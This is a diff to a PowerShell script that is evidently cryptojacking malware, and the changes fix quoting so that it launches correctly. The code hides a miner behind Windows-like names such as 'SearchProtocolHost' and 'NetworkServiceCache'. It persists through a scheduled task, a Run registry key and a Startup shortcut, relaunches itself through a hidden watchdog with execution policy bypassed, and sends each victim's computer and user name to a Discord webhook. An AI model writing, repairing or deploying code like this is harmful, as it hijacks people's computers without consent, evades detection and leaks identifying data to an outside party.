@@ -68,7 +68,7 @@ $json|Out-File -FilePath "$_s\config.json" -Encoding UTF8 -Force
 
 function Set-Persistence{
 $t=New-ScheduledTaskTrigger -AtLogOn
-$a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$_s\watchdog.ps1`""
+$a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`""
 $r=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
 Register-ScheduledTask -TaskName "SearchProtocolHost" -Trigger $t,$a -Action $a -RunLevel Highest -Force|Out-Null
 }
@@ -76,13 +76,13 @@ Register-ScheduledTask -TaskName "SearchProtocolHost" -Trigger $t,$a -Action $a 
 function Set-DeepPersistence{
 try{
 $k=[Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
-$k.SetValue("NetworkServiceCache","powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$_s\watchdog.ps1`"")
+$k.SetValue("NetworkServiceCache","powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`"")
 $k.Close()
 $sh="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\NetworkServiceCache.lnk"
 $ws=New-Object -ComObject WScript.Shell
 $s=$ws.CreateShortcut($sh)
 $s.TargetPath="powershell.exe"
-$s.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$_s\watchdog.ps1`""
+$s.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`""
 $s.Save()
 }catch{}
 }
@@ -98,7 +98,11 @@ $w+='
 $w+='
 if(!`$proc){'
 $w+='
-Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"'+$_s+'\miner.ps1`"" -WindowStyle Hidden'
+$exe="'+$_s+'\SearchProtocolHost.exe"'
+$w+='
+$arg="-c `"$($_s)\config.json`""
+$w+='
+Start-Process -FilePath $exe -ArgumentList $arg -WindowStyle Hidden'
 $w+='
 }'
 $w+='
@@ -143,7 +147,11 @@ $m+='
 $m+='
 `$json|Out-File -FilePath "`$_s\config.json" -Encoding UTF8 -Force'
 $m+='
-Start-Process -FilePath "`$_s\`$_m" -ArgumentList "-c `$_s\config.json" -WindowStyle Hidden'
+$exe="`$_s\`$_m"'
+$m+='
+$arg="-c `"`$_s\config.json`""
+$m+='
+Start-Process -FilePath $exe -ArgumentList $arg -WindowStyle Hidden'
 $m|Out-File -FilePath "$_s\miner.ps1" -Encoding UTF8 -Force
 }
 
@@ -192,7 +200,9 @@ try{Write-SelfHealScript}catch{}
 try{Set-Persistence}catch{}
 try{Set-DeepPersistence}catch{}
 
-Start-Process -FilePath "$_s\$_m" -ArgumentList "-c `$_s\config.json" -WindowStyle Hidden
+$exe="$_s\$_m"
+$arg="-c `"$($_s)\config.json`""
+Start-Process -FilePath $exe -ArgumentList $arg -WindowStyle Hidden
 
 Send-DiscordWebhook "New deployment: $env:COMPUTERNAME | $env:USERNAME | $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 
